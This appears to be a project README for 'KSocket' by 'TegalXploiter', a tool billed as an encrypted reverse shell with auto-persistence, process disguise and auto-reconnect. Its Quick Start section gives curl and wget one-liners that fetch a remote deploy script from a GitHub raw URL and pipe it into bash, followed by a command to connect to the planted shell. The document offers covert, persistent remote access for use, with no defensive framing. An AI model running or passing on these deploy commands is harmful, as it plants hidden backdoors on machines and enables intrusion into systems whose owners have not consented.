# KSocket - TegalXploiter

Encrypted reverse shell with auto-persistence. Single file deploy, secret-key based connection

## Features

- Single file deploy
- Secret key connection
- End-to-end encrypted (SRP-AES-256-CBC-SHA)
- Auto-persistence
- Process disguise
- Auto-reconnect
- Full interactive PTY
- Root & non-root support
- Zero dependency
- Lightweight (~0% CPU)

## Quick Start

### Deploy

```bash
bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
```
```bash
S="MySecret123" bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
```
```bash
bash -c "$(wget -qO- https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
```
### Uninstall

```bash
curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy | bash -s uninstall
```
```bash
wget -qO- https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy  | bash -s uninstall
```
### Connect

```bash
ks -s "SECRET" -i
```

### Uninstall

```bash
./deploy uninstall
```
Created BY TegalXploiter
